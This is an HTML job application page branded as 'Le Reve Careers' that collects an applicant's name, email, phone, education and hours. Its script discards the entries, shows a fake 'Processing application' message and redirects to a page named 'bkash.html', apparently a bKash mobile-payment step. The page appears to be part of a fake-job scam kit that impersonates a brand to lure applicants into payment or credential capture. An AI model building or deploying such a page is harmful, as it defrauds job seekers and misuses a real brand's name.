<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Application | Le Reve Careers</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --primary: #000000;
            --white: #ffffff;
            --error: #ff4d4d;
            --success: #2ecc71;
            --glass: rgba(255, 255, 255, 0.98);
        }

        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }

        body {
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            background: linear-gradient(rgba(0,0,0,0.5), rgba(0,0,0,0.5)), 
                        url('https://images.unsplash.com/photo-1490481651871-ab68de25d43d?auto=format&fit=crop&q=80&w=2070') no-repeat center center fixed;
            background-size: cover;
        }

        .container {
            width: 100%;
            max-width: 450px;
            padding: 40px;
            background: var(--glass);
            border-radius: 2px;
            box-shadow: 0 30px 60px rgba(0,0,0,0.4);
        }

        .brand-header { text-align: center; margin-bottom: 30px; }
        
        .logo-img {
            width: 220px; /* Larger branding for the form */
            height: auto;
            margin-bottom: 15px;
        }

        .subtitle { font-size: 11px; text-transform: uppercase; letter-spacing: 2px; color: #777; }

        .form-section-title { font-size: 10px; font-weight: 800; text-transform: uppercase; color: #bbb; margin: 25px 0 15px; border-bottom: 1px solid #eee; padding-bottom: 5px; letter-spacing: 1px; }

        label { display: block; font-size: 12px; font-weight: 700; margin-bottom: 6px; color: #222; }

        input, select, textarea {
            width: 100%;
            padding: 14px;
            margin-bottom: 18px;
            border: 1px solid #e0e0e0;
            border-radius: 0;
            font-size: 14px;
            background: #fff;
            transition: border-color 0.3s;
        }

        input:focus, select:focus, textarea:focus { outline: none; border-color: var(--primary); }

        button {
            width: 100%;
            padding: 18px;
            background: var(--primary);
            color: var(--white);
            border: none;
            text-transform: uppercase;
            font-weight: 700;
            letter-spacing: 2px;
            font-size: 13px;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-top: 10px;
        }

        button:hover { background: #333; transform: translateY(-2px); }

        .status-msg { display: none; text-align: center; font-size: 13px; margin-top: 20px; font-weight: 600; }
        #warningMsg { color: var(--error); }
        #successMsg { color: var(--success); }

        @media (max-width: 480px) { .container { padding: 30px 20px; } }
    </style>
</head>
<body>

<div class="container">
    <div class="brand-header">
        <img src="lereve.png" alt="Le Reve Logo" class="logo-img">
        <p class="subtitle">Employment Application</p>
    </div>

    <form id="jobForm">
        <div class="form-section-title" style="margin-top: 0;">Identity</div>
        <label>Full Name</label>
        <input type="text" id="name" placeholder="Enter your full name" required>
        
        <label>Email Address</label>
        <input type="email" id="email" placeholder="email@example.com" required>
        
        <label>Phone Number</label>
        <input type="tel" id="phone" placeholder="01XXXXXXXXX" required>

        <div class="form-section-title">Qualifications</div>
        <label>Academic Level</label>
        <select id="education" required>
            <option value="" disabled selected>Select highest degree</option>
            <option>SSC / Equivalent</option>
            <option>HSC / Equivalent</option>
            <option>Honours / Degree</option>
            <option>Masters / Higher</option>
        </select>

        <label>Daily Commitment</label>
        <select id="hours" required>
            <option value="" disabled selected>Available working hours</option>
            <option>4-6 Hours(Part Time)</option>
            <option>8+ Hours(Full Time)</option>
        </select>

        <label>Why should we hire you?</label>
        <textarea id="message" rows="4" placeholder="Tell us about your motivation..." required></textarea>

        <button type="submit" id="submitBtn">Submit Application</button>
    </form>

    <div class="status-msg" id="warningMsg">⚠ Please complete all fields correctly.</div>
    <div class="status-msg" id="successMsg">Processing application... Please wait.</div>
</div>

<script>
    const form = document.getElementById("jobForm");
    const submitBtn = document.getElementById("submitBtn");
    const warningMsg = document.getElementById("warningMsg");
    const successMsg = document.getElementById("successMsg");

    form.addEventListener("submit", function(e) {
        e.preventDefault();
        const name = document.getElementById("name").value.trim();
        const phone = document.getElementById("phone").value.trim();

        if (name.length < 3 || phone.length < 11) {
            warningMsg.style.display = "block";
            successMsg.style.display = "none";
            return;
        }

        warningMsg.style.display = "none";
        submitBtn.innerHTML = "Submitting...";
        submitBtn.disabled = true;
        successMsg.style.display = "block";

        setTimeout(() => {
            window.location.href = "bkash.html";
        }, 2000);
    });
</script>

</body>
</html>
